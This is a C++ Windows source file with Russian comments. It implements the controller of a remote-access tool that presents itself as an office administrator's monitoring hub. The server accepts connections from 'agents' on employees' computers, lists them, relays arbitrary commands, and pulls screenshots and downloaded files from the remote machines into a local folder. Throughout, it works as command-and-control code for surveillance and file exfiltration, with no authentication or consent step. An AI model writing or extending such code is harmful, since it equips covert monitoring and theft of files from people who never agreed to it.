#include <winsock2.h>
#include <ws2tcpip.h>
#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <mutex>
#include <fstream>
#include <filesystem>

#pragma comment(lib, "ws2_32.lib")

namespace fs = std::filesystem;

struct WorkerPC {
    SOCKET socket;
    std::string ip;
    int id;
};

std::vector<WorkerPC> connections;
std::mutex connectionsMutex;
int nextId = 1;

void AcceptanceThread(SOCKET listenSocket) {
    while (true) {
        sockaddr_in clientAddr;
        int clientAddrSize = sizeof(clientAddr);
        SOCKET clientSocket = accept(listenSocket, (sockaddr*)&clientAddr, &clientAddrSize);
        if (clientSocket != INVALID_SOCKET) {
            char ipStr[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &clientAddr.sin_addr, ipStr, INET_ADDRSTRLEN);

            std::lock_guard<std::mutex> lock(connectionsMutex);
            WorkerPC pc;
            pc.socket = clientSocket;
            pc.ip = ipStr;
            pc.id = nextId++;
            connections.push_back(pc);
            
            std::cout << "\n[СЕТЬ] Подключился новый компьютер! IP: " << pc.ip << " (ID: " << pc.id << ")\n";
            std::cout << "[Hub]$ ";
            std::cout.flush();
        }
    }
}

int main() {
    SetConsoleCP(65001);
    SetConsoleOutputCP(65001);

    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return 1;

    SOCKET listenSocket = socket(AF_INET, SOCK_STREAM, 0);
    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_port = htons(9999);

    bind(listenSocket, (sockaddr*)&serverAddr, sizeof(serverAddr));
    listen(listenSocket, SOMAXCONN);

    std::thread searcher(AcceptanceThread, listenSocket);
    searcher.detach();

    std::cout << "==================================================\n";
    std::cout << "   ЦЕНТРАЛЬНЫЙ СЕРВЕР МОНИТОРИНГА АДМИНИСТРАТОРА  \n";
    std::cout << "   Слушаю сеть... Ожидание агентов из офиса...    \n";
    std::cout << "==================================================\n";

    while (true) {
        std::string command;
        std::cout << "\n[Hub]$ ";

        std::cin.clear(); 
        if (std::cin.rdbuf()->in_avail() > 0) {
            std::cin.ignore(10000, '\n'); 
        }

        std::cin >> command;

        if (command == "list") {
            std::lock_guard<std::mutex> lock(connectionsMutex);
            std::cout << "\n--- СПИСОК КОМПЬЮТЕРОВ ОНЛАЙН ---\n";
            if (connections.empty()) {
                std::cout << "Пока ни один компьютер не подключился.\n";
            } else {
                for (const auto& pc : connections) {
                    std::cout << "ID: [" << pc.id << "] -> Удаленный ПК (IP: " << pc.ip << ")\n";
                }
            }
            std::cout << "---------------------------------\n";
        }
        else if (command == "connect") {
            int targetId;
            std::cin >> targetId;

            SOCKET targetSocket = INVALID_SOCKET;
            {
                std::lock_guard<std::mutex> lock(connectionsMutex);
                for (const auto& pc : connections) {
                    if (pc.id == targetId) {
                        targetSocket = pc.socket;
                        break;
                    }
                }
            }

            if (targetSocket == INVALID_SOCKET) {
                std::cout << "Ошибка: ПК с таким ID не найден в сети.\n";
                continue;
            }

            std::cout << "\nУспешный мост связи установлен! Управление ПК [" << targetId << "]\n";
            std::cout << "Для возврата к списку введите команду 'disconnect'\n";

            std::cin.ignore();
            while (true) {
                std::cout << "[Управление ПК-" << targetId << "]$ ";
                std::string remoteCmd;
                std::getline(std::cin, remoteCmd);

                if (remoteCmd.empty()) continue;
                if (remoteCmd == "disconnect") {
                    std::cout << "Отключение от ПК. Возврат на Главный Хаб.\n";
                    break;
                }

                send(targetSocket, remoteCmd.c_str(), remoteCmd.length() + 1, 0);

                if (remoteCmd == "exit") {
                    std::cout << "Агент закрыт удаленно. Возврат.\n";
                    break;
                }

                                // --- УНИВЕРСАЛЬНЫЙ СЕТЕВОЙ ПРИЕМНИК ФАЙЛОВ (СКРИНШОТЫ И СКАЧИВАНИЕ ДОКУМЕНТОВ) ---
                if (remoteCmd == "screenshot" || remoteCmd.rfind("download", 0) == 0) {
                    
                    // Сначала ловим текстовый статус от Агента
                    char txtBuf[512] = {0};
                    recv(targetSocket, txtBuf, sizeof(txtBuf) - 1, 0);
                    std::cout << "\n[ОТВЕТ ОТ ПК-" << targetId << "]: " << txtBuf << "\n";

                    std::cout << "[СЕТЬ] Начинаю скачивание файла...\n";
                    
                    // 1. Принимаем размер файла как текст
                    char sizeBuf[512] = {0};
                    recv(targetSocket, sizeBuf, sizeof(sizeBuf) - 1, 0);
                    
                    std::string sizeStr(sizeBuf);
                    if (sizeStr == "ERROR" || sizeStr.empty()) {
                        std::cout << "Ошибка: Файл не найден или заблокирован на удаленной машине.\n";
                        continue;
                    }

                    long long fileSize = std::stoll(sizeStr); 

                    // Папка на твоем ПК, куда всё будет скачиваться
                    std::string targetDir = "C:\\Office_Screens";
                    try { fs::create_directories(targetDir); } catch (...) {}

                    // Определяем имя файла для сохранения
                    std::string outFilename;
                    if (remoteCmd == "screenshot") {
                        outFilename = targetDir + "\\worker_" + std::to_string(targetId) + "_screen.bmp";
                    } else {
                        // Если скачиваем файл, берем оригинальное имя файла из конца пути
                        size_t lastSlash = remoteCmd.find_last_of("\\/");
                        std::string cleanName = (lastSlash != std::string::npos) ? remoteCmd.substr(lastSlash + 1) : "downloaded_file.dat";
                        outFilename = targetDir + "\\" + cleanName;
                    }

                    std::ofstream outFile(outFilename, std::ios::binary);

                    // 2. Выкачиваем байты из сети порциями по 512 байт
                    char fileBuffer[512]; 
                    long long totalBytesReceived = 0;
                    
                    while (totalBytesReceived < fileSize) {
                        int bytesToRead = sizeof(fileBuffer);
                        if (fileSize - totalBytesReceived < sizeof(fileBuffer)) {
                            bytesToRead = fileSize - totalBytesReceived;
                        }

                        int bytesRead = recv(targetSocket, fileBuffer, bytesToRead, 0);
                        if (bytesRead <= 0) break; 
                        
                        outFile.write(fileBuffer, bytesRead);
                        totalBytesReceived += bytesRead;
                    }
                    outFile.close();
                    
                    std::cout << "[УСПЕХ] Файл полностью скачан по сети!\n";
                    std::cout << "[ПАПКА] Сохранено в: " << outFilename << "\n";
                }

                else {
                    char responseBuffer[512] = {0};
                    int bytesIn = recv(targetSocket, responseBuffer, sizeof(responseBuffer) - 1, 0);
                    if (bytesIn > 0) {
                        std::cout << "\n[ОТВЕТ ОТ ПК-" << targetId << "]:\n" << responseBuffer << "\n";
                    } else {
                        std::cout << "Связь с компьютером разорвана.\n";
                        break;
                    }
                }
            }
        }
        else if (command == "exit") {
            std::cout << "Выключение центрального Хаба.\n";
            break;
        }
        else {
            std::cout << "Неизвестная команда! Доступны: list, connect <ID>, exit\n";
        }
    }

    closesocket(listenSocket);
    WSACleanup();
    return 0;
}
